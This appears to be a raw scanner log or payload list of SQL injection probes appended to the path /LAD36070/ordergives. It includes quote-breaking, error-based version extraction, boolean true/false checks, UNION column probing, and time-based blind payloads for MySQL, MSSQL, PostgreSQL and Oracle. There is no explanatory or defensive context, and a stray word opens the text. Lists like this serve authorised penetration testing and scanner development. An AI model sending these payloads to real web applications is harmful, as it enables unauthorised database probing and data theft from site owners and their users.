hrlli

/LAD36070'/ordergives
/LAD36070''/ordergives
/LAD36070' AND 1/0--/ordergives
/LAD36070' AND 1=CONVERT(int,(SELECT @@version))--/ordergives
/LAD36070' AND LENGTH(NULL)--/ordergives
/LAD36070' AND 1=1--/ordergives
/LAD36070' AND 1=2--/ordergives
/LAD36070' UNION SELECT NULL--/ordergives
/LAD36070' UNION SELECT 1,2,3--/ordergives
/LAD36070' AND SLEEP(5)--/ordergives
/LAD36070' WAITFOR DELAY '00:00:05'--/ordergives
/LAD36070' || pg_sleep(5)--/ordergives
/LAD36070' AND dbms_pipe.receive_message('a',5)--/ordergives
